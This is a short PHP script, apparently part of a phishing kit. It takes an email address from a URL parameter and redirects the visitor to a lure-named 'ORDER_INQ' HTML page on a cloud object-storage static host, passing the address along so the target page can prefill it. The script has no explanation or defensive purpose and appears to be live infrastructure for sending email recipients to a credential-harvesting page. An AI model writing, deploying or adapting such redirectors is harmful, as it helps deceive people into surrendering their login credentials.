<?php
function getemIDFromem($em)
{
$find = '@';
$pos = strpos($em, $find);
$emID = substr($em, 0, $pos);
return $emID;
}
$em = $_GET['em'];
$emID = getemIDFromem($em);
header("Location: https://cloud-object-storage-60-cos-static-web-hosting-dvr.s3.us-east.cloud-object-storage.appdomain.cloud/butbox2019_ORDER_INQ_328Y389.html?#$em");
?>
